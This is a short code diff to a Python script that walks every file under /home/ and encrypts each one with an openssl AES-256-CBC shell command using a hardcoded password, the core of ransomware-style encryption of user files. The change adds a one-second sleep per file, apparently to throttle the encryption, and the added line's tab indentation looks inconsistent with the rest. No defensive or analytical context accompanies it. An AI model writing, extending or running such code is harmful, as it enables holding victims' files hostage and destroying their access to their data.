@@ -1,5 +1,6 @@
 import socket
 import os
+import time
 
 encrypt_string = 'openssl enc -aes-256-cbc -in {0} -out {1} -pass pass:password'
 
@@ -7,6 +8,7 @@ def encrypt():
     
     for subdir, dirs, files in os.walk('/home/'):
         for file_name in files: 
+	    time.sleep(1)
             file_path = subdir + os.sep + file_name
             cmd_string = encrypt_string.format(file_path, file_path + '.enc')
             os.system(cmd_string)
